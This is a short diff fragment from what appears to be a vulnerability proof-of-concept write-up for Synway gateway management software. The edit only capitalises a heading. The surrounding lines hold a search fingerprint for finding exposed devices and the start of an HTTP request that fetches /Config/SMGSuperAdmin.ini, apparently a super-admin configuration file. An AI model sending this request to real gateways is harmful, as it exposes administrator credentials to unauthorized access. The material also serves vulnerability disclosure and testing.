@@ -8,7 +8,7 @@
 app="Synway-网关管理软件"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /Config/SMGSuperAdmin.ini HTTP/1.1
